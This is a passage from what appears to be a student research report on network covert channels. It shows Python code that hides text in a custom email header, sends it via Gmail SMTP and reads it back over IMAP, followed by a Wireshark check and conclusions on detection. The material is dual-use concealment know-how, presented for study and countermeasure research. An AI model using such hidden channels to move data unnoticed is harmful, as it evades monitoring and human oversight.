IMAP allows to work on a single mail accpunt with multiple mail clients, because it keeps the messages on the server and do not removes them, what is a major inconvenience in POP3 protocol. Firstly, only the headers are downloaded whereas the whole message remains on the server. Based on them, the client decides what to do with the message. This is a great place to hide a message which will go unnoticed to the addressee and only he/she knows where to look for it. 

The maximum number of characters that header can store is not specified. The only information found is that it's fine if it fits on one line, but there is an option to wrap the text (the header can be eventually very long).
</div>


### 5.2 Implementation
<div style="text-align: justify">
Hidden message has been sent in an additional header named 'SCS2021'. MIME library makes it easy to manipulate headers and payload. In this implementation the classes MIMEText and MIMEMultipart have been principally used [9]. Listing 15 shows an excerpt from the script used for additional header creation with stored hidden information, which is subsequently sent to the destination e-mail address.

```python
filename = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod ..."
message.add_header('SCS2021', "%s" % filename)
    
(...)
    
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(
        sender_email, receiver_email, message.as_string()
    )
```

<div>
<center><i> 
Listing 15. Adding extra header and sending e-mail with hidden information. </i></center><br>
</div>


To receive the hidden message, it is reccomended to log in to the gmail account. However, using the IMAP protocol, a python script has been implemented to find all e-mails with the header of SCS2021 and display information that they stores (Listing 16). 


```python
import email, imaplib
m = imaplib.IMAP4_SSL("imap.gmail.com")
m.login(user,pwd)
```
<div>
<center><i> Listing 16. Logging into Gmail account.  </i></center><br>
</div>
Searching for hidden fields from the header is shown at Listing 17.

```python
m.select( ) 
type, data = m.search(None, 'ALL')

for num in data[0].split():
    typ, data = m.fetch(num, '(RFC822)' )

    for response_part in data:
        if isinstance(response_part, tuple):
            msg = email.message_from_string(response_part[1].decode('utf-8'))
            email_subject = msg['subject']
            email_from = msg['from']
            email_heder = msg['SCS2021']
```
</div>

<div>
<center><i> Listing 17. Searching for right header.  </i></center>
</div>


### 5.3 Validation
<div style="text-align: justify">
Using script send.py and gmail account, send email with secret header message. On the Figure 10 we can see what kind of message will be seen by the user who does not know where to look for the right content.
    
    

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_96b5dbf24d750188f32a8c28d93a6e4f.png)

<div>
<center><i> Figure 10. Gmail default view.  </i></center><br>
</div>



But if a user who knows that a message has been hidden in the headers, after a while they will see a message that is about 1000 characters long. This is shown in Figure 11.

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_a319d76c96d4d6adc176218fa784d4a9.png)

<div>
<center><i> Figure 11. Original message in Gmail web interface.  </i></center><br>
</div>

Another script named retrieve.py was written in order to log into the gmail account, retrieve and display the subject, sender and the message sent in the custom header named SCS, where the sender has hidden a message (Figure 12).

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_15482e889db089a316e3e4096146ff06.png)


   <div>
<center><i> Figure 12. CLI - recieved secret message  </i></center><br>
</div> 
    


![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_e8c1bd2b2158ea5ace6762447e37f1ab.png)

Sniffed data from this example is shown at figures 13, 14. Unfortunately nothing can be seen due to the TLS encryption.    

<div>
<center><i> Figure 13. Wireshark - sending message to gmail (SMTP)  </i></center><br>
</div> 
    
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_34c6525f2d3c2cc1d50bf624c42c9bd3.png)

<div>
<center><i> Figure 14. SMTP payload in Wireshark. 
</i></center><br>
</div> 



## 6. Conclusions
<div style="text-align: justify">
We have successfully utilized covert channels using Domain Name System, Internet Control Message Protocol, and email messages to send and retrieve the original information. Our contribution has included an introduction to hidden communication, a presentation of its background, and possibilities of use. Furthermore, the implementation and verification of the methods for hidden communications have ended with success and the achievement of project goals. The presented results indicate the correctness of the implemented solutions. Moreover, they are consistent with the statement that widely-used protocols and mechanisms such as DNS, ICMP, and email messages can be used as carriers in covert channels for hidden information transmission. Counteraction often comes down to the choice between security, accuracy, complexity and quality, performance and costs. Most of the small and medium companies do not have any Internal Security Department. Because of this, any form of covert communication can remain undetected. Even the biggest IT companies can be compromised by attackers for long period if the C&C communication is non-suspicious [10]. The biggest challenge is the lack of a completely effective method of protection. Network administrators may be concerned about the spread of new techniques such as DoH (DNS over HTTPS) and DoT (DNS over TLS). Encryption of DNS traffic certainly increases users' privacy, but from the point of view of information security it carries considerable risks. Blocking DoH is practically impossible, because port 443/TCP is the basic port in the Internet. DoT looks better in this aspect, as it uses its own port 843/TCP, so it can be easily filtered. However, in that case, users will certainly start using DoH. However, these solutions are not without their drawbacks. If the organization monitors only HTTP/HTTPS traffic, in that case the administrator will be able to detect previously unseen traffic. Finally, the awareness about covert channels, information embedding techniques and methods of hidden transmission are fundamental in a complex process of counteraction should be necessarily included in the set of countermeasure. Accordingly, it is extremely important to know how covert channels can be implemented and how to use them to transmit the hidden information. Finally, future work on this topic can include research and evaluation of the effectiveness of other protocols in the field of hidden information transmission. In addition, the implementation of software for monitoring and notification of suspected use of covert channels in the network can reveal new avenues in the set of countermeasures.
    
    

</div>
    
## 7. References
<div style="text-align: justify">
[1] Luca Caviglione. Trends and challenges in network covert channels countermeasures, 2021.
    

[2] P. Mockapetris - Domain Names - Implementation and Specification, https://www.ietf.org/rfc/rfc1035.txt, visited 05.12.2021
    
[3] Mohammad Taher Pilevar, Heshaam Faili TEP: Tehran English-Persian parallel  corpus Computational Linguistics and Intelligent Text Processing - 12th International Conference, CICLing 2011 

[4] Piotr Głaska - Jak zrozumieć bezpiecznika: ATT&CK, konferencja PLNOG 24-2 20.09.2020

[5] RFC 792 - Internet Control Message Protocol, 1981. https://datatracker.ietf.org/doc/html/rfc792
[6] Harshita. Detection and Prevention of ICMP Flood DDOS Attack. International Journal of New Technology and Research, 3:63–69, 2017. 

[7] Scapy Documentation - packet crafting for Python2 and Python3, visited 08.12.2021: https://scapy.net/ 

[8] M. Crispin. Internet message access protocol - version 4rev1, 2003. 

[9] Python Documentation - Creating email and mime objects from scratch, visted 08.12.2021: https://docs.python.org/3/library/email.mime.html 
    
[10] FireEye, “Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor,” 13.12. 2020. Available: https://www.mandiant.com/resources/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor. Visited 04.12.2021

</div>









